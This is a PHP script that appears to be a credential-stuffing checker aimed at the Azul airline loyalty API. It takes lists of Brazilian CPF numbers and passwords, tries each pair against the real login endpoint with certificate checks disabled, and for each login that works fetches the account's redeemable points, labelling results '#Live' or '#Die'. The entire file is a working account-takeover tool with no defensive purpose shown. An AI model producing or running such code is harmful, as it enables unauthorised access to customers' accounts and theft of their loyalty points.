<?php
error_reporting(0);

function getStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

$lista = $_GET['lista'];
$cpf = multiexplode($lista)[0];
$senha = multiexplode($lista)[1];
# Filtrar catão inválido
$c = strlen($cpf);
if (($c < 11) || ($c > 11)) {
  exit("#Die $cpf | Retorno: Formato Inválido");
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ta-clm-api.voeazul.com.br/clm-api/services/cwa/azul/auth');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-type: application/json',
  'origin: https://www.voeazul.com.br',
  'referer: https://www.voeazul.com.br/',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"login":"'.$cpf.'","password":"'.$senha.'"}');
$auth = curl_exec($ch);
$obj = json_decode($auth);

if (strpos($auth, 'Status":true')) {
  $Id = $obj->ReturnObject->Id;
  $SecurityToken = $obj->ReturnObject->SecurityToken;

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://ta-clm-api.voeazul.com.br/clm-api/services/cwa/customer/refreshData');
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-type: application/json',
    'origin: https://www.voeazul.com.br',
    'referer: https://www.voeazul.com.br/',
  ));
  curl_setopt($ch, CURLOPT_POSTFIELDS, '{"ReturnObject":{"Id":"'.$Id.'","SecurityToken":"'.$SecurityToken.'"}}');
  $refreshData = curl_exec($ch);
  $obj = json_decode($refreshData);
  $RedeemablePoints = $obj->ReturnObject->RedeemablePoints;
  exit("#Live $lista | Pontos resgatáveis: $RedeemablePoints");
}else{
  exit("#Die $lista | Retorno: $obj->globalErrorMessage");
}

?>